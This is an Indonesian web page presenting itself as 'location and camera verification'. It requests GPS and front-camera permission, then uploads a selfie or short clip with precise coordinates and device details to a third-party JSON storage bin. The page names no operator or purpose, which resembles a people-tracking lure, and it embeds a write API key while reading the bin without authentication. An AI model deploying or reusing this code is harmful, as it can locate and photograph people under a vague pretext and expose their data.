<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Lokasi & Kamera</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 18px;
        }
        .card {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 16px;
            padding: 24px 20px;
            max-width: 430px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        h1 { font-size: 19px; margin-bottom: 8px; color: #fff; }
        p { font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 14px; }
        .step-badge {
            display: inline-block;
            font-size: 11px;
            font-weight: 600;
            padding: 4px 10px;
            border-radius: 999px;
            background: rgba(59, 130, 246, 0.16);
            color: #60a5fa;
            margin-bottom: 10px;
        }
        .input-group { margin-bottom: 12px; text-align: left; }
        .input-group label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 5px; }
        .input-group input {
            width: 100%;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #fff;
            font-size: 14px;
        }
        .loc-box {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 10px 12px;
            font-size: 12px;
            color: #94a3b8;
            margin-bottom: 12px;
            text-align: left;
        }
        .loc-box.ok { border-color: rgba(34, 197, 94, 0.4); color: #4ade80; }
        .camera-box {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 14px;
            aspect-ratio: 4 / 3;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .cam-placeholder {
            font-size: 13px;
            color: #64748b;
            padding: 14px;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 8px;
        }
        .btn-loc { background: #3b82f6; color: #fff; }
        .btn-loc:hover { background: #2563eb; }
        .btn-cam { background: #6366f1; color: #fff; display: none; }
        .btn-cam:hover { background: #4f46e5; }
        .action-row { display: none; gap: 8px; margin-bottom: 8px; }
        .btn-photo { flex: 1; background: #10b981; color: #fff; margin-bottom: 0; }
        .btn-photo:hover { background: #059669; }
        .btn-rec { flex: 1; background: #ef4444; color: #fff; margin-bottom: 0; }
        .btn-rec:hover { background: #dc2626; }
        .btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.8; }
        .status {
            margin-top: 8px;
            font-size: 12px;
            padding: 10px;
            border-radius: 8px;
            display: none;
        }
        .status.success { display: block; background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
        .status.error { display: block; background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
        .privacy-note { font-size: 11px; color: #64748b; margin-top: 12px; }
    </style>
</head>
<body>

<div class="card">
    <span class="step-badge" id="stepBadge">Langkah 1 dari 2: Izin Lokasi</span>
    <h1>📍📷 Verifikasi Lokasi & Kamera</h1>
    <p>Izinkan akses lokasi terlebih dahulu, lalu aktifkan kamera untuk mengirim foto atau klip rekaman singkat.</p>

    <div class="input-group">
        <label for="userName">Nama / Keterangan (Opsional)</label>
        <input type="text" id="userName" placeholder="Masukkan nama Anda...">
    </div>

    <div id="locBox" class="loc-box">Status Lokasi: Belum diizinkan</div>

    <div class="camera-box">
        <div id="camPlaceholder" class="cam-placeholder">Kamera belum aktif</div>
        <video id="videoPreview" autoplay playsinline muted></video>
    </div>

    <canvas id="captureCanvas" style="display:none;"></canvas>

    <button id="btnLoc" class="btn btn-loc" onclick="requestLocationFirst()">1. Izinkan Lokasi</button>
    <button id="btnCam" class="btn btn-cam" onclick="startRealtimeCamera()">2. Aktifkan Kamera Realtime</button>

    <div id="actionRow" class="action-row">
        <button id="btnPhoto" class="btn btn-photo" onclick="sendPhoto()">📸 Ambil & Kirim Foto</button>
        <button id="btnRecord" class="btn btn-rec" onclick="recordAndSendClip()">🎥 Rekam Klip (4d)</button>
    </div>

    <div id="statusBox" class="status"></div>
    <div class="privacy-note">Lokasi dan kamera hanya aktif setelah Anda menyetujui izin di browser.</div>
</div>

<script>
    const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
    const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
    const RECORD_DURATION_MS = 4000; // Durasi klip 4 detik agar ukuran JSON tetap ringan

    let locationData = null;
    let cameraStream = null;
    let isBusy = false;

    const stepBadge = document.getElementById('stepBadge');
    const locBox = document.getElementById('locBox');
    const btnLoc = document.getElementById('btnLoc');
    const btnCam = document.getElementById('btnCam');
    const actionRow = document.getElementById('actionRow');
    const btnPhoto = document.getElementById('btnPhoto');
    const btnRecord = document.getElementById('btnRecord');
    const video = document.getElementById('videoPreview');
    const canvas = document.getElementById('captureCanvas');
    const placeholder = document.getElementById('camPlaceholder');
    const statusBox = document.getElementById('statusBox');

    function showStatus(msg, type) {
        statusBox.textContent = msg;
        statusBox.className = 'status ' + type;
    }

    function setButtonsDisabled(disabled) {
        btnPhoto.disabled = disabled;
        btnRecord.disabled = disabled;
    }

    // TAHAP 1: Minta izin lokasi dulu
    function requestLocationFirst() {
        if (!navigator.geolocation) {
            showStatus("Browser tidak mendukung GPS / lokasi.", "error");
            return;
        }

        btnLoc.disabled = true;
        btnLoc.textContent = "Meminta izin lokasi...";

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                locationData = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    akurasi: Math.round(pos.coords.accuracy) + " meter"
                };
                locBox.className = "loc-box ok";
                locBox.textContent = `Lokasi diizinkan: ${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)} (±${locationData.akurasi})`;

                stepBadge.textContent = "Langkah 2 dari 2: Kamera Realtime";
                btnLoc.style.display = "none";
                btnCam.style.display = "block";
                showStatus("Lokasi berhasil didapat. Silakan aktifkan kamera realtime.", "success");
            },
            (err) => {
                btnLoc.disabled = false;
                btnLoc.textContent = "1. Izinkan Lokasi";
                let msg = "Izin lokasi ditolak.";
                if (err.code === err.POSITION_UNAVAILABLE) msg = "Lokasi tidak tersedia saat ini.";
                if (err.code === err.TIMEOUT) msg = "Permintaan lokasi habis waktu.";
                showStatus(msg, "error");
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }

    // TAHAP 2: Aktifkan kamera realtime setelah lokasi diizinkan
    async function startRealtimeCamera() {
        if (!locationData) {
            showStatus("Izinkan lokasi terlebih dahulu.", "error");
            return;
        }
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            showStatus("Browser tidak mendukung akses kamera.", "error");
            return;
        }

        btnCam.disabled = true;
        btnCam.textContent = "Membuka kamera...";

        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            });
            video.srcObject = cameraStream;
            video.style.display = "block";
            placeholder.style.display = "none";
            btnCam.style.display = "none";
            actionRow.style.display = "flex";
            showStatus("Kamera realtime aktif. Pilih Ambil & Kirim Foto atau Rekam Klip (4d).", "success");
        } catch (err) {
            btnCam.disabled = false;
            btnCam.textContent = "2. Aktifkan Kamera Realtime";
            showStatus("Izin kamera ditolak atau kamera gagal dibuka.", "error");
        }
    }

    function takePhotoBase64() {
        const targetW = 480;
        const vw = video.videoWidth || 640;
        const vh = video.videoHeight || 480;
        const targetH = Math.round((vh / vw) * targetW);

        canvas.width = targetW;
        canvas.height = targetH;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, targetW, targetH);
        return canvas.toDataURL('image/jpeg', 0.55);
    }

    function pickSupportedMimeType() {
        const types = [
            'video/webm;codecs=vp8',
            'video/webm',
            'video/mp4'
        ];
        for (const t of types) {
            if (window.MediaRecorder && MediaRecorder.isTypeSupported(t)) {
                return t;
            }
        }
        return '';
    }

    function recordClipBase64() {
        return new Promise((resolve, reject) => {
            if (!cameraStream || !window.MediaRecorder) {
                reject(new Error("Perekaman video tidak didukung browser ini."));
                return;
            }

            const mimeType = pickSupportedMimeType();
            const options = { videoBitsPerSecond: 180000 };
            if (mimeType) options.mimeType = mimeType;

            let recorder;
            try {
                recorder = new MediaRecorder(cameraStream, options);
            } catch (e) {
                recorder = new MediaRecorder(cameraStream);
            }

            const chunks = [];
            recorder.ondataavailable = (ev) => {
                if (ev.data && ev.data.size > 0) chunks.push(ev.data);
            };

            recorder.onerror = () => reject(new Error("Gagal merekam klip video."));

            recorder.onstop = () => {
                const finalMime = recorder.mimeType || mimeType || 'video/webm';
                const blob = new Blob(chunks, { type: finalMime });
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = () => reject(new Error("Gagal mengonversi rekaman."));
                reader.readAsDataURL(blob);
            };

            recorder.start();
            setTimeout(() => {
                if (recorder.state === "recording") {
                    recorder.stop();
                }
            }, RECORD_DURATION_MS);
        });
    }

    async function pushEntryToStorage(entry) {
        const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`);
        let currentData = { logs: [] };
        if (getRes.ok) {
            const parsed = await getRes.json();
            if (parsed && Array.isArray(parsed.logs)) {
                currentData = parsed;
            }
        }

        currentData.logs.unshift(entry);

        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
        const putRes = await fetch(putUrl, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(currentData)
        });

        if (!putRes.ok) {
            throw new Error("Gagal menyimpan ke JSONStorage (kemungkinan ukuran data melebihi batas).");
        }
    }

    async function sendPhoto() {
        if (isBusy || !cameraStream) return;
        isBusy = true;
        setButtonsDisabled(true);
        btnPhoto.textContent = "Mengirim...";

        try {
            const foto = takePhotoBase64();
            const nama = document.getElementById('userName').value.trim() || "Anonim";

            await pushEntryToStorage({
                id: Date.now(),
                tipe: "foto",
                nama: nama,
                foto: foto,
                video: null,
                lat: locationData.lat,
                lng: locationData.lng,
                akurasi: locationData.akurasi,
                waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
                perangkat: navigator.userAgent
            });

            showStatus("Foto dan lokasi berhasil dikirim ke admin!", "success");
        } catch (err) {
            showStatus(err.message || "Gagal mengirim foto.", "error");
        } finally {
            btnPhoto.textContent = "📸 Ambil & Kirim Foto";
            isBusy = false;
            setButtonsDisabled(false);
        }
    }

    async function recordAndSendClip() {
        if (isBusy || !cameraStream) return;
        isBusy = true;
        setButtonsDisabled(true);
        btnRecord.textContent = "Merekam 4d...";
        showStatus("Sedang merekam klip 4 detik...", "success");

        try {
            const videoBase64 = await recordClipBase64();
            btnRecord.textContent = "Mengirim...";
            const nama = document.getElementById('userName').value.trim() || "Anonim";

            await pushEntryToStorage({
                id: Date.now(),
                tipe: "rekaman",
                nama: nama,
                foto: null,
                video: videoBase64,
                lat: locationData.lat,
                lng: locationData.lng,
                akurasi: locationData.akurasi,
                waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
                perangkat: navigator.userAgent
            });

            showStatus("Klip rekaman dan lokasi berhasil dikirim ke admin!", "success");
        } catch (err) {
            showStatus(err.message || "Gagal mengirim rekaman klip.", "error");
        } finally {
            btnRecord.textContent = "🎥 Rekam Klip (4d)";
            isBusy = false;
            setButtonsDisabled(false);
        }
    }
</script>

</body>
</html>
